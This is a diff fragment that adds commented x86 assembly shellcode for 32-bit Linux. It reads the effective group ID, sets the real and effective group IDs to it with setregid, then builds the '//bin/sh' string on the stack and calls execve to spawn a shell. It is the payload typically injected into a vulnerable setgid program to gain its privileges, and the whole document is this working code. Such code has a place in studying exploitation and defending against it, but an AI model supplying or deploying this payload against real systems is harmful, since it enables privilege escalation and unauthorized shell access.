@@ -1,0 +1,27 @@
+    xor %eax,%eax
+          mov $SYS_getegid, %al
+          int $0x80
+       // run setregid(ret, ret);
+          mov  %eax, %ebx
+          mov  %eax, %ecx
+          xor  %eax, %eax
+          mov  $SYS_setregid, %al
+          int  $0x80
+            //      execve("//bin/sh", 0, 0);
+
+       // build the "//bin/sh" string here.
+          xor %eax,%eax
+          mov %eax,%ebx
+          mov %eax,%ecx
+          push %eax
+          mov $SYS_execve,%al
+          push $0x68732f6e
+          push $0x69622f2f
+          // set arguments.
+          mov %esp,%ebx
+          // call execve.
+          // system call: 'int $0x80'
+          int $0x80
+
+
+
